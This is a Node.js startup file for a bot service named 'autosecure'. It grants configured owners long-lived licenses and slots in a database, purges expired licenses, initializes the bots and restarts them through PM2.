const { spawn, exec } = require("child_process");
const { initializeDB, queryParams } = require("./db/database");
const { initializeController } = require("./mainbot/controllerbot");
const initializeBots = require("./mainbot/handlers/initializeBots");
const owners = require("./config.json").owners;
const hasAccess = require("./db/access");
const pm2 = require("pm2"); 
const generate = require("./autosecure/utils/generate");



let initializationStatus = new Map();
initializationStatus.set('botsInitialized', false);
initializationStatus.set('initializationTime', null);
initializationStatus.set('initializedBotsCount', 0);

const currentCmdPid = process.ppid;

async function fixexpiredlicenses() {
  try {
    const now = Date.now().toString();
    const expiredLicenses = await queryParams("SELECT license FROM usedLicenses WHERE expiry < ?", [now]);

    if (expiredLicenses.length > 0) {
      for (const row of expiredLicenses) {
        await queryParams("DELETE FROM usedLicenses WHERE license = ?", [row.license]);
      }
      console.log(`Removed ${expiredLicenses.length} expired license(s).`);
    }
  } catch (err) {
    console.error("Error fixing expired licenses:", err);
  }
}

async function startBot(restart = false) {
  try {
    if (restart) {
      console.log("Restarting bot...");

      pm2.connect((err) => {
        if (err) {
          console.error("Failed to connect to PM2:", err);
          process.exit(1);
        }

        pm2.restart("autosecure", (err, apps) => {
          if (err) {
            console.error("Failed to restart bot:", err);
            process.exit(1);
          }
          console.log("Bot successfully restarted!");
          pm2.disconnect();
          process.exit(0);
        });
      });

      return;
    }

    await initializeController();

    let ownersAccessed = false;
    const durationMs = 100 * 365 * 24 * 60 * 60 * 1000; // 100 years in milliseconds

    for (const ownerId of owners) {
      const hasOwnerAccess = await hasAccess(ownerId, "1");

      let id = generate(32);

      if (!hasOwnerAccess) {
        const existingSlots = await queryParams(
          "SELECT slots FROM slots WHERE user_id = ?",
          [ownerId]
        );

        if (existingSlots.length === 0) {
          await queryParams(
            "INSERT INTO slots (user_id, slots) VALUES (?, ?)",
            [ownerId, 1]
          );
        } else {
          await queryParams(
            "UPDATE slots SET slots = ? WHERE user_id = ?",
            [1, ownerId]
          );
        }

        const secureExists = await queryParams(
          "SELECT 1 FROM secureconfig WHERE user_id = ?",
          [ownerId]
        );
        if (secureExists.length === 0) {
          await queryParams("INSERT INTO secureconfig (user_id) VALUES (?)", [ownerId]);
        }

        const expiry = (Date.now() + durationMs).toString();
        await queryParams(
          "INSERT INTO usedLicenses (license, user_id, expiry) VALUES (?, ?, ?)",
          [id, ownerId, expiry]
        );

        ownersAccessed = true;
      }
    }

    if (ownersAccessed) {
      console.log(`Automatically gave owners access!`);
    }

    await fixexpiredlicenses();
    let amount = await initializeBots();
    console.log(`Initialized ${amount} Bots`);
    

    initializationStatus.set('botsInitialized', true);
    initializationStatus.set('initializationTime', new Date());
    initializationStatus.set('initializedBotsCount', amount);
  } catch (error) {
    console.error("Error during initialization:", error);
    initializationStatus.set('initializationError', error.message);
    process.exit(1);
  }
}

if (require.main === module) {
  startBot()
}

module.exports = { 
  startBot,
  initializationStatus
};